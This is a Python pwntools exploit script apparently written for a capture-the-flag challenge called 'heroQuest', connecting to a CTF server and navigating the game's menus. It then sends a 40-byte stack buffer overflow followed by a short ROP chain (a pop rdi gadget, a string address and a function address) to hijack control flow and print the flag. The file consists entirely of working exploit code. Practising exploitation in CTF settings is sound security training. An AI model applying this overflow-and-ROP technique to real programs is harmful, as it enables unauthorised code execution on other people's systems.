#!/usr/bin/env python3

from pwn import *

# Set up the target
binary = './heroQuest'

# For local testing
# # p = process(binary)

# For remote connection (based on challenge.txt)
p = remote('tjc.tf', 31365)

# Address analysis from objdump:
# - save function allocates 32 bytes on stack (sub $0x20,%rsp)
# 
# Key addresses:
# - finalBoss string: 0x4025fb  
# - fight function: 0x4014db
# - pop rdi; ret gadget: 0x4017ab

# The buffer is 32 bytes, plus 8 bytes for saved rbp = 40 bytes to reach return address
payload_size = 32 + 8

# ROP chain to call fight("finalBoss", 40, 10000)
pop_rdi = 0x4017ab  # pop rdi; ret
finalBoss_addr = 0x4025fb  # address of "finalBoss" string
fight_addr = 0x4014db  # fight function

# For now, let's try a simpler approach: call fight with finalBoss string
# We may need to set up other registers too, but let's see what happens

payload = b'A' * payload_size
payload += p64(pop_rdi)           # pop rdi; ret
payload += p64(finalBoss_addr)    # "finalBoss" string address goes into rdi
payload += p64(fight_addr)        # call fight function

# Start the game
print("Starting exploit...")

# Enter save name
p.recvuntil(b'save file! ')
p.sendline(b'test')

# Go west to village
p.recvuntil(b'(w)est. ')
p.sendline(b'w')

# Choose to rest at inn (triggers save function)  
p.recvuntil(b'back ')
p.sendline(b'r')

# Send the payload to overflow the buffer
p.recvuntil(b'save file: ')
p.sendline(payload)

# Try to receive the flag
try:
    response = p.recvall(timeout=5)
    print("Response:")
    print(response.decode('utf-8', errors='ignore'))
except:
    print("No response or timeout")

p.close()

